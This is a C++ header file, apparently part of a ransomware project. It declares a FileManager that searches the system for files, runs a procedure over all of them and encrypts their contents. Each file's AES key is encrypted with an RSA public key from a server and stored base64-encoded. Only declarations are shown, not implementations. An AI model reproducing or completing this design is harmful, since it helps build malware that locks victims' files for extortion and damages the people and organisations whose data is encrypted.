#pragma once

#include "LogicateCryptography.h"
#include "Serialization.h"

#include <fstream>
#include <vector>
#include <filesystem>

class FileManager;

// can also send over sockets
class File {
friend FileManager;
public:
    File(std::string& path);

    bool              FilePathExists();
    std::string       ReadFrom();
    bool              WriteTo(std::string& data);
    inline void       SetEncryptionKey(BYTESTRING key) { this->m_B64RSAAESKey = std::move(key); };
    inline ULONG      GetFileSize() { return this->m_Metadata.size; };
private: 
    struct FileMetadata {
        BYTESTRING    path;      // full path with name
        ULONG         size;      // bytes
        BYTESTRING    name;      // file name
        BYTESTRING    extension; // file extension, e.g txt
        BYTESTRING    contents;  // data in the file
    } m_Metadata;

    /* 
       aes key encrypted with rsa public key from server
       encoded with base64
       that was used to encrypt the file
    */
    BYTESTRING        m_B64RSAAESKey;
};

class FileManager {
public:
    inline void       SetPublicKey(RSA* key) { this->m_EncryptionKeys.pub = key; }
    inline void       SetPrivateKey(RSA* key) { this->m_EncryptionKeys.priv = key; }
    void              FindFiles(const std::string& startPath); // search system for files
    void              TransformFiles(const std::string& startPath, void (FileManager::*procedure)(File&), FileManager& context); // run a function on all files found in startPath
    void              EncryptContents(File& file);             // encrypt the contents of 'file'
    void              DecryptContents(File& file);
    inline void       AddFile(File& file) { this->m_FileList.push_back(file); }
    void              OutputFoundFiles();                      // output all files in FileList 
    inline File&      GetFile(int index) { return this->m_FileList.at(index); } // yea i know this can throw an error
private:
    std::vector<File> m_FileList;
    RSAKeys           m_EncryptionKeys; // key to encrypt generated aes keys with
};
